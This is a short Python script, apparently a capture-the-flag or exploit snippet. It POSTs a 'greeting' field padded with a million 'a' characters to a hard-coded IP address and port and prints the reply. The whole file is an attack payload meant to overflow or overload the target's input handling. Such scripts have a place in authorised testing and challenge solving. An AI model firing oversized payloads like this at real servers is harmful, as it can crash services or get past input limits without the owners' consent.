#!/usr/bin/python3
#coding:utf-8

import requests

r = requests.post('http://106.75.66.87:8888/', data={
    'greeting': 'Merry Christmas' + 'a' * 1000000
})

print(r.text)